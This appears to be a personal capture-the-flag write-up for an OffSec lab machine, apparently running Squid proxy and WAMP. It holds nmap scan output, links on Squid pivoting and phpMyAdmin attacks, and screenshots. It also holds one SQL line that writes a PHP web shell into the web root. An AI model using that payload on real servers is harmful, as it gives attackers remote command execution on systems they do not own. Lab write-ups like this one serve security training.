# nmap
```
┌──(kali㉿kali)-[~/PG/squid]
└─$ nmap -p- --min-rate 10000 192.168.192.189           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-01 22:26 EST
Nmap scan report for 192.168.192.189
Host is up (0.0098s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3128/tcp  open  squid-http
49666/tcp open  unknown
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
                                                                                                                                                  
┌──(kali㉿kali)-[~/PG/squid]
└─$ nmap -p 135,139,445,3128,49666,49667 -sCV 192.168.192.189
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-01 22:27 EST
Nmap scan report for 192.168.192.189
Host is up (0.0089s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-server-header: squid/4.14
|_http-title: ERROR: The requested URL could not be retrieved
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-02T03:28:37
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.55 seconds
```

![Pasted image 20250302112955](<0. Attachments/Pasted image 20250302112955.png>)

# web enum
[3128 - Pentesting Squid - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html)

[GitHub - aancw/spose: Squid Pivoting Open Port Scanner](https://github.com/aancw/spose)

![Pasted image 20250302115242](<0. Attachments/Pasted image 20250302115242.png>)

![Pasted image 20250302115150](<0. Attachments/Pasted image 20250302115150.png>)

![Pasted image 20250302115203](<0. Attachments/Pasted image 20250302115203.png>)

![Pasted image 20250302115424](<0. Attachments/Pasted image 20250302115424.png>)
![Pasted image 20250302115925](<0. Attachments/Pasted image 20250302115925.png>)

that worked
![Pasted image 20250302115953](<0. Attachments/Pasted image 20250302115953.png>)

![Pasted image 20250302121047](<0. Attachments/Pasted image 20250302121047.png>)

[How to Hack MySQL Databases. Pentesting phpMyAdmin](https://www.securitynewspaper.com/2020/11/30/how-to-hack-mysql-databases-pentesting-phpmyadmin/)

![Pasted image 20250302121143](<0. Attachments/Pasted image 20250302121143.png>)

```
SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "C:/wamp/www/cmd.php"
```

![Pasted image 20250302121157](<0. Attachments/Pasted image 20250302121157.png>)

![Pasted image 20250302121439](<0. Attachments/Pasted image 20250302121439.png>)

some issue with offsec servers, cant even put the flag or get a reverse shell